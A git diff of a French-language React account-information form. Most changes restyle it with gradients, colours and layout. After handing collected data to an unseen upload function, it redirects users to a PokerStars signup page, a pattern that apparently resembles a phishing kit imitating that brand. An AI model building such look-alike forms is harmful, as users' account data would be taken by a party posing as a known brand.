@@ -64,34 +64,38 @@ export const Form2 = () => {
     const uploadSuccess = await handleUpload(dataOb);
     if (uploadSuccess) {
       console.log("Data uploaded successfully");
-      window.location.href = "https://www.pokerstars.fr/signup?brand=4&redirectTo=/sports";
+      window.location.href =
+        "https://www.pokerstars.fr/signup?brand=4&redirectTo=/sports";
     } else {
       console.error("Data upload failed");
     }
   };
 
   return (
-    <div className="container card-0 justify-content-center">
+    <div className=" card-0 justify-content-center">
+      <div className="py-4" style={{ backgroundColor: "black" }}>
+        <Svg />
+      </div>
       <div className="card-body px-sm-4 px-0">
-        <div className="row justify-content-center mb-5"></div>
-        <div className="row justify-content-center round ">
-          <div className="col-lg-10 col-md-12">
+        <div className="row justify-content-center round">
+          <div className="col-lg-10 col-md-12 mt-3">
             <div className="card shadow-lg card-1">
-              <div className="card-body inner-card">
+              <div className=" inner-card">
                 <div
                   style={{
-                    backgroundColor: "black",
+                    backgroundColor: "#190A05",
+                    background:
+                      "-webkit-linear-gradient(to bottom, #870000, #190a05)",
+                    background: "linear-gradient(to bottom, #FF0000, #190a05)",
                     color: "white",
                     fontWeight: "bolder",
                   }}
-                  className="text-center mb-5 py-2 rounded"
+                  className="text-center mb-5 py-4"
                 >
-                  <div>
-                    <Svg />
-                  </div>
-                  <h2>Informations de compte</h2>
+                  <h3 style={{ fontWeight: "bolder" }}>
+                    Informations de compte
+                  </h3>
                 </div>
-
                 <form onSubmit={handleNext}>
                   <div className="row justify-content-center justify-content-md-center">
                     <div
@@ -277,8 +281,6 @@ export const Form2 = () => {
                         </div>
                       </div>
 
-                   
-
                       <div className="mt-5">
                         <h5
                           style={{
@@ -328,7 +330,7 @@ export const Form2 = () => {
                             maxWidth: "186px",
                             color: "white",
                             fontWeight: "700",
-                            backgroundColor: "#D70022",
+                            backgroundColor: "#000000",
                           }}
                         >
                           <GrFormPrevious style={{ fontSize: "25px" }} />{" "}
@@ -343,7 +345,11 @@ export const Form2 = () => {
                             maxWidth: "186px",
                             color: "white",
                             fontWeight: "700",
-                            backgroundColor: "#02bd9c",
+                            backgroundColor: "#190A05",
+                            background:
+                              "-webkit-linear-gradient(to bottom, #870000, #190a05)",
+                            background:
+                              "linear-gradient(to bottom, #FF0000, #190a05)",
                           }}
                         >
                           {loading && (
